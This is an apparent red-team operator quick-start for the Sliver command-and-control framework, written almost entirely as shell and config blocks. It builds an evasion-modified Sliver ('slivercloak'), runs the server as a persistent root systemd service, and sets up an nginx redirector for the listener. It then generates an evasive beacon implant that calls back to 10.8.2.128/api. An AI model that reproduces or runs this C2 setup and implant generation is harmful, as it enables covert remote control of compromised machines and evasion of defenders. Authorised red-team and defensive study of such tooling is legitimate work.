# Ops Quick Start

## Sliver

### 1.6 Install

```bash
# prereqs
apt update -y && apt install -y gpg curl build-essential zip unzip jq git mingw-w64 binutils-mingw-w64 g++-mingw-w64 docker.io docker-buildx

# cloak
git clone https://github.com/thelikes/slivercloak /opt/slivercloak
cd /opt/slivercloak
docker build -f Dockerfile.1.6 -t cloak:1.6 .
docker run -v $(pwd)/output:/tmp/output -it cloak:1.6 cloak -modules all

# sliver
cp /opt/sliver/*-server /root/sliver-server
cp /opt/sliver/*-client /usr/local/bin/sliver-client
ln -sf /usr/local/bin/sliver-client /usr/local/bin/sliver
chmod 755 /usr/local/bin/sliver
/root/sliver-server unpack --force

cat > /etc/systemd/system/sliver.service <<-EOF
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/root/sliver-server daemon

[Install]
WantedBy=multi-user.target
EOF

chown root:root /etc/systemd/system/sliver.service
chmod 600 /etc/systemd/system/sliver.service
systemctl start sliver
~/./sliver-server operator -l 127.0.0.1 -n op1 -P all
sliver import op1_127.0.0.1.cfg
```

### Redirector Install


```
server {
    listen 80;

    root /var/www/html;

    location /api {
        proxy_pass http://localhost:31080;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### Boot

```bash
# listener
http --lhost 127.0.0.1 --lport 31080 --persistent

# exe implant
generate beacon --disable-sgn --evasion --seconds 10 --jitter 20 --http 10.8.2.128/api --name exe-one

# fix the armory
armory modify Default --url https://api.github.com/repos/armory/armory/releases
```
